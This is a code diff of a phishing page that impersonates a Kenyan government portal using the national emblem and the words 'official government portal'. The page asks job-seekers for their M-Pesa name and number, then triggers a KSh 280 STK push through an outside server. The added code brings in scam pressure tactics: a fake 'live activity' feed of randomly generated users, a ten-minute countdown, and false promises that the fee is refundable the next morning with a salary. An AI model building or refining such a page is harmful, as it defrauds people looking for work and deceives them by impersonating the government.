@@ -3,224 +3,244 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Digital Payment Portal</title>
+<title>Payment Verification | NADU Portal</title>
 <script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
 <style>
-  :root {
-    --saf-green: #00b288;
-    --gov-blue: #003366;
-    --gold: #ffd700;
+  :root { --saf-green: #49aa47; --navy: #002147; --gold: #ffcc00; }
+  .saf-bg { background-color: var(--saf-green); }
+  .navy-bg { background-color: var(--navy); }
+  .border-gold { border-color: var(--gold); }
+  
+  /* STK Push Pulse Animation */
+  .stk-pulse {
+    animation: shadow-pulse 1.5s infinite;
   }
-  .saf-bg {
-    background-color: var(--saf-green);
+  @keyframes shadow-pulse {
+    0% { box-shadow: 0 0 0 0px rgba(73, 170, 71, 0.5); }
+    100% { box-shadow: 0 0 0 15px rgba(73, 170, 71, 0); }
   }
-  .gov-header {
-    background-color: var(--gov-blue);
-  }
-  .glow {
-    box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
-  }
-  .border-gold {
-    border-color: var(--gold);
-  }
-  .shadow-xl {
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-  }
+
   .loader {
-    border: 6px solid #f3f3f3;
-    border-top: 6px solid #00b288;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid var(--saf-green);
     border-radius: 50%;
-    width: 50px;
-    height: 50px;
+    width: 40px;
+    height: 40px;
     animation: spin 1s linear infinite;
   }
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  
+  .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
 </style>
 </head>
-<body class="flex items-center justify-center bg-[#f4f7f9] min-h-screen font-sans">
+<body class="bg-[#f0f4f8] font-sans min-h-screen">
 
-<!-- Main Card Container -->
-<div class="max-w-3xl w-full p-8 bg-white rounded-lg shadow-xl border-2 border-gold relative animate__animated animate__fadeInUp">
-
-  <!-- Header -->
-  <div class="flex items-center justify-center mb-6 px-4 py-2 rounded-lg bg-gradient-to-r from-[#006699] to-[#003366] text-white font-bold uppercase shadow-md">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Kenya_Government_Emblem.svg" alt="Kenya Government" class="h-12 w-12 mr-3" />
-    <h1 class="text-xl md:text-2xl uppercase tracking-wide">Kenya National Digital Payment Portal</h1>
-  </div>
-
-  <!-- Title and Introduction -->
-  <h2 class="text-center text-3xl font-bold text-[#003366] mb-4">Official Payment for Digital Typist Registration</h2>
-  <p class="text-center text-gray-700 mb-6 px-4 text-sm">
-    To complete your registration for the Kenya Digital Typist Program, a mandatory government processing fee of <span class="font-semibold text-xl text-green-600">KSh 280</span> is required. This fee ensures your identity verification and secures your participation in the national digitization initiative. <br/><br/>
-    Rest assured, this fee will be fully refunded with your very first payout, as part of our transparent and secure process.
-  </p>
-
-  <!-- Payment Instructions -->
-  <div class="bg-[#00b288] text-white p-6 rounded-lg mb-8 shadow-md">
-    <h3 class="text-xl font-semibold mb-2">Payment Details</h3>
-    <p class="mb-2">An STK Push payment request will be sent directly to your registered M-Pesa account. Please ensure your M-Pesa is active and funded.</p>
-    <p class="text-sm mb-2">After confirming the payment on your phone, please fill in your M-Pesa details below to proceed with verification.</p>
-  </div>
-
-  <!-- Payment Form -->
-  <form id="paymentForm" class="space-y-4 mb-6" novalidate>
-    <div>
-      <label for="mpesaName" class="block text-gray-800 font-semibold mb-1">M-Pesa Full Name</label>
-      <input type="text" id="mpesaName" placeholder="Your Full M-Pesa Name" required class="w-full p-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-green-600" />
-      <p class="text-red-600 text-sm mt-1 hidden" id="nameError">Please enter your full name.</p>
+<div class="navy-bg text-white py-2 px-4 flex justify-between items-center text-[10px] font-bold uppercase tracking-widest">
+    <div class="flex items-center gap-2">
+        <i class="fas fa-lock text-green-400"></i> 
+        256-BIT SSL SECURED PAYMENT GATEWAY
     </div>
-    <div>
-      <label for="mpesaNumber" class="block text-gray-800 font-semibold mb-1">M-Pesa Phone Number</label>
-      <input type="tel" id="mpesaNumber" placeholder="e.g., 0712345678" required class="w-full p-3 rounded-lg border-2 border-gray-300 focus:outline-none focus:border-green-600" />
-      <p class="text-red-600 text-sm mt-1 hidden" id="numberError">Please enter a valid Kenyan phone number.</p>
-    </div>
-    <button type="button" onclick="initiatePayment()" class="w-full bg-[#00b288] hover:bg-green-500 text-white font-bold py-4 px-6 rounded-lg shadow-lg transition-transform transform hover:scale-105">
-      Pay Now
-    </button>
-  </form>
-
-  <!-- "STK push sent" message below form, initially hidden -->
-  <div id="stkPushMsgContainer" class="w-full max-w-3xl mx-auto px-4 mb-4 hidden">
-    <div class="text-orange-500 font-semibold text-lg text-center" id="stkPushMsg"></div>
-  </div>
-
-  <!-- Official Notice -->
-  <div class="mt-4 text-center text-sm text-gray-600 italic px-4">
-    <p>This is an official government portal for the Kenya Digital Typist Program. Please verify all details before proceeding. Unauthorized payments are not accepted.</p>
-  </div>
+    <div class="hidden md:block">OFFICIAL GOVERNMENT PORTAL: NADU/VERIFY/2026</div>
 </div>
 
-<!-- Processing Overlay -->
-<div id="processingOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50 flex-col space-y-4 p-4">
-  <div class="loader"></div>
-  <div id="processingMessage" class="text-white text-lg font-semibold text-center"></div>
-  <button id="cancelBtn" class="mt-4 bg-red-600 hover:bg-red-700 text-white font-semibold py-2 px-4 rounded" onclick="cancelProcess()">Cancel</button>
+<div class="max-w-4xl mx-auto p-4 md:pt-10">
+    <div class="flex items-center justify-between mb-8 bg-white p-6 rounded-2xl shadow-sm border-b-4 border-gold">
+        <div class="flex items-center gap-4">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Kenya_Government_Emblem.svg" alt="Kenya Seal" class="h-16 w-16" />
+            <div>
+                <h1 class="text-xl md:text-2xl font-black text-[#002147] leading-none uppercase italic">Step 2: <span class="text-[#49aa47]">Authentication</span></h1>
+                <p class="text-[10px] font-bold text-gray-500 uppercase mt-1">Archive Personnel Identity Verification</p>
+            </div>
+        </div>
+        <div class="text-right">
+            <p class="text-[10px] font-bold text-gray-400">SESSION EXPIRES IN:</p>
+            <p id="timer" class="text-red-600 font-black text-xl italic">09:59</p>
+        </div>
+    </div>
+
+    <div class="grid lg:grid-cols-3 gap-6">
+        <div class="lg:col-span-2 space-y-6">
+            <div class="glass p-8 rounded-[2.5rem] shadow-2xl border border-white">
+                <h3 class="text-2xl font-black text-navy mb-2 italic">M-PESA INSTANT ACTIVATION</h3>
+                <p class="text-gray-600 text-sm mb-8 font-medium">
+                    Enter your M-Pesa details below. A secure **STK Push request** will be sent to your handset immediately for the one-time 280/- activation fee.
+                </p>
+
+                <form id="paymentForm" class="space-y-6">
+                    <div class="group">
+                        <label class="text-[10px] font-black text-gray-400 uppercase ml-4 mb-1 block">Registered Full Name</label>
+                        <input type="text" id="mpesaName" placeholder="AS PER M-PESA ACCOUNT" class="w-full bg-gray-50 border-2 border-gray-100 p-5 rounded-3xl focus:border-green-500 outline-none font-bold text-gray-700 transition-all uppercase" />
+                        <p id="nameError" class="text-red-600 text-xs mt-1 ml-4 hidden">Please enter your full name as registered on M-Pesa.</p>
+                    </div>
+
+                    <div class="group">
+                        <label class="text-[10px] font-black text-gray-400 uppercase ml-4 mb-1 block">Handset Phone Number</label>
+                        <div class="relative">
+                            <span class="absolute left-5 top-1/2 -translate-y-1/2 font-bold text-gray-400">+254</span>
+                            <input type="tel" id="mpesaNumber" placeholder="7XXXXXXXX" class="w-full bg-gray-50 border-2 border-gray-100 p-5 pl-16 rounded-3xl focus:border-green-500 outline-none font-bold text-gray-700 transition-all" />
+                        </div>
+                        <p id="phoneError" class="text-red-600 text-xs mt-1 ml-4 hidden">Enter a valid 10-digit number starting with 07 or 01.</p>
+                    </div>
+
+                    <div class="bg-green-50 p-4 rounded-2xl border border-green-100 flex items-start gap-3">
+                        <i class="fas fa-info-circle text-green-600 mt-1"></i>
+                        <p class="text-[11px] text-green-800 font-medium leading-tight">
+                            Note: Once you click "REQUEST STK PUSH", keep your phone unlocked. Enter your M-Pesa PIN when the prompt appears to finalize your registration.
+                        </p>
+                    </div>
+
+                    <button type="button" onclick="handleStkPush()" class="stk-pulse saf-bg w-full text-white font-black py-6 rounded-[2.5rem] text-lg shadow-xl hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-3">
+                        REQUEST STK PUSH <i class="fas fa-fingerprint"></i>
+                    </button>
+                </form>
+
+                <div id="stkStatus" class="hidden mt-8 text-center animate-bounce">
+                    <div class="loader mx-auto mb-4"></div>
+                    <p class="text-navy font-black italic">Awaiting PIN Confirmation on your phone...</p>
+                    <p class="text-[10px] text-gray-400 uppercase mt-1">Do not refresh this page</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="space-y-6">
+            <div class="navy-bg p-6 rounded-[2.5rem] text-white shadow-xl relative overflow-hidden">
+                <div class="relative z-10">
+                    <h4 class="font-black text-gold text-sm italic uppercase mb-4">Security Breakdown</h4>
+                    <ul class="text-[11px] space-y-4 opacity-90">
+                        <li class="flex gap-3"><i class="fas fa-check-circle text-green-400 mt-1"></i> <span>Verification fee (KSh 280) is anti-fraud protocol to block bot registration.</span></li>
+                        <li class="flex gap-3"><i class="fas fa-check-circle text-green-400 mt-1"></i> <span>100% Refundable with first salary batch (Tomorrow 8:00 AM).</span></li>
+                        <li class="flex gap-3"><i class="fas fa-check-circle text-green-400 mt-1"></i> <span>Activates B2C Payout API for daily withdrawals.</span></li>
+                    </ul>
+                </div>
+                <i class="fas fa-shield-halved absolute -bottom-4 -right-4 text-white/5 text-8xl"></i>
+            </div>
+
+            <div class="bg-white p-6 rounded-[2.5rem] shadow-lg border border-gray-100">
+                <h4 class="font-black text-gray-800 text-[10px] uppercase mb-4">Live Activity Monitor</h4>
+                <div id="liveFeed" class="space-y-3">
+                    </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-12 text-center pb-10">
+        <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest italic">Official Digitization Partnership • Vision 2030 • NGO Council</p>
+    </footer>
+</div>
+
+<div id="overlay" class="fixed inset-0 bg-navy/95 z-[100] hidden flex items-center justify-center p-6 text-center">
+    <div id="overlayContent" class="max-w-xs">
+        <div class="loader w-16 h-16 border-t-gold mx-auto mb-6"></div>
+        <h3 class="text-white font-black text-xl italic uppercase tracking-tighter mb-2">Sending Stk Push, Please Wait...</h3>
+        <p class="text-gray-400 text-xs uppercase tracking-widest font-bold">Initiating Secure Transaction</p>
+    </div>
 </div>
 
 <script>
-  let cancelFlag = false;
+    // Live Transaction Feed Simulator
+    const feed = document.getElementById('liveFeed');
+    const actions = ["Verified", "Paid", "Activated", "Signed"];
+    const locations = ["Nairobi", "Mombasa", "Kisumu", "Eldoret", "Nakuru"];
 
-  function validatePhoneNumber(number) {
-    const num = number.replace(/\s+/g, '');
-    let formattedNumber = null;
-
-    if (num.startsWith('254')) {
-      if (num.length === 12 && (num.startsWith('2547') || num.startsWith('2541'))) {
-        formattedNumber = '0' + num.slice(3);
-      } else {
-        return null;
-      }
-    } else if (/^(07|01)\d{8}$/.test(num)) {
-      formattedNumber = num;
-    } else if (/^\d{10}$/.test(num) && (/^(07|01)/.test(num))) {
-      formattedNumber = num;
+    function updateFeed() {
+        const div = document.createElement('div');
+        div.className = "flex items-center justify-between text-[10px] font-bold animate__animated animate__fadeInUp";
+        div.innerHTML = `
+            <span class="text-gray-500"><i class="fas fa-user-circle mr-1"></i> User ${Math.floor(Math.random()*999)}</span>
+            <span class="text-green-600 uppercase">${actions[Math.floor(Math.random()*actions.length)]}</span>
+        `;
+        feed.prepend(div);
+        if(feed.children.length > 5) feed.removeChild(feed.lastChild);
     }
-    return formattedNumber;
-  }
+    setInterval(updateFeed, 3000);
 
-  function showError(id, message) {
-    const errorElem = document.getElementById(id);
-    errorElem.textContent = message;
-    errorElem.classList.remove('hidden');
-  }
+    // 10 Minute Timer
+    let time = 599;
+    const timerElem = document.getElementById('timer');
+    setInterval(() => {
+        let mins = Math.floor(time / 60);
+        let secs = time % 60;
+        timerElem.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        if(time > 0) time--;
+    }, 1000);
 
-  function hideError(id) {
-    document.getElementById(id).classList.add('hidden');
-  }
+    // Payment Logic
+    async function handleStkPush() {
+        const nameInput = document.getElementById('mpesaName');
+        const phoneInput = document.getElementById('mpesaNumber');
+        const nameError = document.getElementById('nameError');
+        const phoneError = document.getElementById('phoneError');
+        
+        // Reset errors
+        nameError.classList.add('hidden');
+        phoneError.classList.add('hidden');
 
-  function cancelProcess() {
-    cancelFlag = true;
-  }
+        let name = nameInput.value.trim();
+        let phone = phoneInput.value.replace(/\s+/g, '').replace('+', '');
+        let isValid = true;
 
-  async function initiatePayment() {
-    // Reset previous errors
-    hideError('nameError');
-    hideError('numberError');
+        // Name Validation
+        if(name.length < 3) {
+            nameError.classList.remove('hidden');
+            isValid = false;
+        }
 
-    const nameInput = document.getElementById('mpesaName');
-    const numberInput = document.getElementById('mpesaNumber');
+        // Phone Validation and Formatting
+        if (phone.startsWith('254')) {
+            phone = '0' + phone.slice(3);
+        }
+        
+        const phoneRegex = /^(07|01)\d{8}$/;
+        if(!phoneRegex.test(phone)) {
+            phoneError.classList.remove('hidden');
+            isValid = false;
+        }
 
-    const name = nameInput.value.trim();
-    const numberRaw = numberInput.value.trim();
+        if(!isValid) return;
 
-    let valid = true;
+        // Update UI field
+        phoneInput.value = phone.startsWith('0') ? phone.slice(1) : phone;
 
-    if (!name) {
-      showError('nameError', 'Please enter your full name.');
-      valid = false;
+        // Show Processing Overlay
+        const overlay = document.getElementById('overlay');
+        overlay.classList.remove('hidden');
+
+        // Convert for API
+        let apiPhone = '254' + phone.slice(1);
+
+        try {
+            const response = await fetch('https://webserver1-d6jn.onrender.com/pay', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ amount: 280, phone_number: apiPhone })
+            });
+
+            if (response.ok || response.status === 200) {
+                // Smooth transition to 'Awaiting PIN' view
+                setTimeout(() => {
+                    overlay.classList.add('hidden');
+                    document.getElementById('paymentForm').classList.add('hidden');
+                    document.getElementById('stkStatus').classList.remove('hidden');
+                }, 2500);
+            } else {
+                document.getElementById('overlayContent').innerHTML = `
+                    <div class="text-white">
+                        <i class="fas fa-exclamation-triangle text-red-500 text-4xl mb-4"></i>
+                        <h3 class="font-black uppercase italic text-lg">Gateway Busy</h3>
+                        <p class="text-xs text-gray-400 mt-2">Server responded with Error ${response.status}. Please refresh and try again.</p>
+                        <button onclick="location.reload()" class="mt-6 bg-white text-navy px-8 py-2 rounded-full font-black text-[10px] uppercase">Reload</button>
+                    </div>`;
+            }
+        } catch (error) {
+            document.getElementById('overlayContent').innerHTML = `
+                <div class="text-white font-bold">
+                    <i class="fas fa-wifi text-red-500 text-4xl mb-4"></i>
+                    <p>Connection Timeout. Check your internet.</p>
+                    <button onclick="location.reload()" class="mt-4 bg-white text-navy px-8 py-2 rounded-full font-black text-[10px] uppercase">Retry</button>
+                </div>`;
+        }
     }
-
-    const validatedNumber = validatePhoneNumber(numberRaw);
-    if (!validatedNumber) {
-      showError('numberError', 'Please enter a valid Kenyan phone number.');
-      valid = false;
-    }
-
-    if (!valid) return;
-
-    // Show overlay during processing
-    cancelFlag = false;
-    const overlay = document.getElementById('processingOverlay');
-    const messageDiv = document.getElementById('processingMessage');
-    overlay.classList.remove('hidden');
-    messageDiv.className = 'text-white text-lg font-semibold text-center';
-    messageDiv.innerHTML = 'Processing, please wait...';
-
-    // Hide success message if visible (not used here)
-    // document.getElementById('successMessage').classList.add('hidden');
-
-    // Prepare payload
-    const payload = {
-      amount: 280,
-      phone_number: validatedNumber
-    };
-
-    try {
-      const response = await fetch('https://webserver1-d6jn.onrender.com/pay', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload)
-      });
-
-      if (cancelFlag) {
-        overlay.classList.add('hidden');
-        return;
-      }
-
-      if (response.status === 200 || response.ok) {
-        // Hide overlay
-        overlay.classList.add('hidden');
-
-        // Show "STK push sent" message below form
-        const stkMsgContainer = document.getElementById('stkPushMsgContainer');
-        const stkMsg = document.getElementById('stkPushMsg');
-        stkMsg.innerHTML = 'STK push sent, please enter your M-Pesa PIN';
-        stkMsgContainer.classList.remove('hidden');
-
-        // Leave the message visible indefinitely
-
-      } else {
-        // Show error in overlay
-        const errorText = await response.text() || 'Payment failed. Please try again.';
-        showOverlayError(errorText);
-      }
-    } catch (error) {
-      showOverlayError('Network error. Please try again.');
-    }
-  }
-
-  function showOverlayError(msg) {
-    const overlay = document.getElementById('processingOverlay');
-    const messageDiv = document.getElementById('processingMessage');
-    messageDiv.className = 'text-red-600 text-lg font-semibold text-center';
-    messageDiv.innerHTML = msg;
-    setTimeout(() => {
-      overlay.classList.add('hidden');
-    }, 2000);
-  }
 </script>
 </body>
   </html>
